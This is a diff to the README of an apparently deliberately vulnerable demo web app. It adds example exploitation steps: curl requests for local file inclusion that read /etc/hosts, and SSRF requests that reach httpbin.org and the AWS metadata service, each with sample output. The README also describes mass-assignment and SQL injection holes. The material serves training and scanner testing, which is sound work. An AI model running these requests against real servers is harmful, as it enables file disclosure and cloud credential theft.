@@ -214,6 +214,57 @@ Full configuration & usage examples can be found in our [demo project](https://g
 
 - **Local File Inclusion (LFI)** - The /api/files endpoint returns any file on the server from the path that is provided in the _path_ param. The UI uses this endpoint to load crystal images on the landing page.
 
+  <details>
+    <summary>Example Exploitation</summary>
+
+  To demonstrate file disclosure, you can use the following `curl` commands:
+
+  1.  Accessing the `/etc/hosts` File with GET /api/file/raw
+
+      ```bash
+      curl https://brokencrystals.com/api/file/raw\?path\=/etc/hosts
+      ```
+
+      Example Response:
+
+      ```text
+      # Kubernetes-managed hosts file.
+      127.0.0.1       localhost
+      ::1     localhost ip6-localhost ip6-loopback
+      fe00::0 ip6-localnet
+      fe00::0 ip6-mcastprefix
+      fe00::1 ip6-allnodes
+      fe00::2 ip6-allrouters
+      10.0.46.108     brokencrystals-56b48bd6f9-j4x8c
+
+      # Entries added by HostAliases.
+      127.0.0.1       postgres        keycloak-postgres       keycloak        nodejs  proxy   repeater        db      brokencrystals.local
+      ```
+
+  2.  Accessing the `/etc/hosts` File with GET /api/file/
+
+           ```bash
+           curl https://brokencrystals.com/api/file\?path\=/etc/hosts
+           ```
+
+           Example Response:
+
+           ```text
+           # Kubernetes-managed hosts file.
+           127.0.0.1       localhost
+           ::1     localhost ip6-localhost ip6-loopback
+           fe00::0 ip6-localnet
+           fe00::0 ip6-mcastprefix
+           fe00::1 ip6-allnodes
+           fe00::2 ip6-allrouters
+           10.0.46.108     brokencrystals-56b48bd6f9-j4x8c
+
+           # Entries added by HostAliases.
+           127.0.0.1       postgres        keycloak-postgres       keycloak        nodejs  proxy   repeater        db      brokencrystals.local
+           ```
+
+      </details>
+
 - **Mass Assignment** - You can add to user admin privileges upon creating user or updating userdata. When you are creating a new user /api/users/basic you can use additional hidden field in body request { ... "isAdmin" : true }. If you are trying to edit userdata with PUT request /api/users/one/{email}/info you can add this additional field mentioned above. For checking admin permissions there is one more endpoint: /api/users/one/{email}/adminpermission.
 
 - **Open Database** - The index.html file includes a link to manifest URL, which returns the server's configuration, including a DB connection string.
@@ -279,6 +330,74 @@ Full configuration & usage examples can be found in our [demo project](https://g
 
 - **Server-Side Request Forgery (SSRF)** - The endpoint /api/file receives the _path_ and _type_ query parameters and returns the content of the file in _path_ with Content-Type value from the _type_ parameter. The endpoint supports relative and absolute file names, HTTP/S requests, as well as metadata URLs of Azure, Google Cloud, AWS, and DigitalOcean.
   There are specific endpoints for each cloud provider as well - `/api/file/google`, `/api/file/aws`, `/api/file/azure`, `/api/file/digital_ocean`.
+  <details>
+    <summary>Example Exploitation of Server-Side Request Forgery (SSRF)</summary>
+
+  To demonstrate SSRF, you can use the following `curl` commands:
+
+  1. **Triggering a Request to an External Resource**:
+
+     ```bash
+     curl 'https://brokencrystals.com/api/file?path=https://httpbin.org/get'
+     ```
+
+     Example Response:
+
+     ```json
+     {
+       "args": {},
+       "headers": {
+         "Accept": "application/json, text/plain, */*",
+         "Accept-Encoding": "gzip, compress, deflate, br",
+         "Host": "httpbin.org",
+         "User-Agent": "axios/1.7.7",
+         "X-Amzn-Trace-Id": "Root=1-67ea5603-2599f0b04e318fa9241a659d"
+       },
+       "origin": "18.212.149.236",
+       "url": "https://httpbin.org/get"
+     }
+     ```
+
+     This demonstrates that the server can be used to make requests to external resources.
+
+  2. **Triggering a Request to an Internal Network Resource**:
+
+     ```bash
+     curl 'https://brokencrystals.com/api/file?path=http://169.254.169.254/latest/meta-data/ami-id'
+     ```
+
+     Example Response:
+
+     ```text
+     ami-id
+     ami-launch-index
+     ami-manifest-path
+     block-device-mapping/
+     events/
+     hostname
+     iam/
+     instance-action
+     instance-id
+     instance-life-cycle
+     instance-type
+     local-hostname
+     local-ipv4
+     mac
+     metrics/
+     network/
+     placement/
+     profile
+     public-hostname
+     public-ipv4
+     public-keys/
+     reservation-id
+     security-groups
+     services/%
+     ```
+
+     This demonstrates that the server can access internal network resources, which could expose sensitive information.
+
+  </details>
 
 - **SQL injection (SQLi)** - The `/api/testimonials/count` endpoint receives and executes SQL query in the query parameter. Similarly, the `/api/products/views` endpoint utilizes the `x-product-name` header to update the number of views for a product. However, both of these parameters can be exploited to inject SQL code, making these endpoints vulnerable to SQL injection attacks.
   <details>
